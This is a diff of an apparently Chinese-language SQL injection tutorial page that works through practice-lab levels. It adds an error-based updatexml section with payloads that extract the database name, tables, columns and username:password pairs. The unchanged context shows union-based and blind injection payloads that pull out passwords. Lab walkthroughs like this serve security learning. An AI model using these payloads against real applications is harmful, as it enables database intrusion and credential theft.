@@ -285,7 +285,7 @@ password<span class="pl-k">=</span>anypassword</pre></div>
 <h3>9. ‌ 窃取数据（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM users),3 --+）‌</h3>
 <p>示例‌：SELECT GROUP_CONCAT(username) FROM users<br>
 原理‌：直接查询users表的username列，数据回显到页面。</p>
-<h3>显注</h3>
+<h3>显注（以第一关为例）</h3>
 <div class="highlight highlight-source-sql"><pre class="notranslate">?id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> --+</span>
 <span class="pl-s">select * form users where id=1<span class="pl-pds">'</span></span> <span class="pl-c"><span class="pl-c">--</span>   </span>
 <span class="pl-c"><span class="pl-c">#</span>URL中的+号被转义成空格</span>
@@ -315,7 +315,7 @@ id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</s
 
 id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,(select group_concat(username) from users),3--+  </span>
 <span class="pl-s">#查询users表中username这一列的所有值</span></pre></div>
-<h3>盲注</h3>
+<h3>盲注 （以第五关为例）</h3>
 <div class="highlight highlight-source-sql"><pre class="notranslate">?id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span>  </span>
 <span class="pl-s">#观察页面是否异常，并判定闭合方式</span>
 <span class="pl-s"></span>
@@ -345,10 +345,28 @@ id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</s
 <span class="pl-s"></span>
 <span class="pl-s">?id=1<span class="pl-pds">'</span></span> <span class="pl-k">and</span> ascii(substr((<span class="pl-k">select</span> password <span class="pl-k">from</span> users <span class="pl-k">where</span> username<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>admin<span class="pl-pds">'</span></span> <span class="pl-k">limit</span> <span class="pl-c1">0</span>,<span class="pl-c1">1</span>),<span class="pl-c1">1</span>,<span class="pl-c1">1</span>))<span class="pl-k">&gt;</span><span class="pl-c1">50</span> <span class="pl-c"><span class="pl-c">--</span>+</span>
 <span class="pl-c"><span class="pl-c">#</span>猜解密码</span>
+</pre></div>
+<p>#以第六关为例</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate">updatexml(XML_document, XPath_string, new_value)
+<span class="pl-c"><span class="pl-c">#</span> XML_document:需要被修改的 XML 文档   XPath_string：一个合法的 XPath 表达式，用于定位 XML 文档中需要修改的节点  new_value：替换目标 XML 节点的新值</span>
 
-
-
-</pre></div></div>
+?id<span class="pl-k">=</span><span class="pl-c1">1</span> 页面返回正常；输入 ?id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> 无报错，排除单引号闭合。尝试 ?id=1<span class="pl-cce">\"</span> 触发语法错误，显示双引号闭合的报错信息‌</span>
+<span class="pl-s"></span>
+<span class="pl-s">输入 ?id=1" --+（闭合双引号并注释后续代码），页面恢复正常，确认注入点为‌双引号闭合字符型注入</span>
+<span class="pl-s"></span>
+<span class="pl-s">?id=1" and updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+</span>
+<span class="pl-s">#报错显示security数据库名</span>
+<span class="pl-s"></span>
+<span class="pl-s">?id=1" and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1)), 1) --+</span>
+<span class="pl-s">#报错显示表名，通过修改limit值显示所有表名</span>
+<span class="pl-s"></span>
+<span class="pl-s">?id=1" and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name=<span class="pl-pds">'</span></span>users<span class="pl-s"><span class="pl-pds">'</span> limit 0,1)), 1) --+</span>
+<span class="pl-s">#显示列名 通过修改limit值显示所有列名</span>
+<span class="pl-s"></span>
+<span class="pl-s">?id=1" and updatexml(1, concat(0x7e, (select concat(username, <span class="pl-pds">'</span></span>:<span class="pl-s"><span class="pl-pds">'</span>, password) from users limit 0,1)), 1) --+</span>
+<span class="pl-s">#获取数据 通过修改limit值显示所有数据</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span></pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
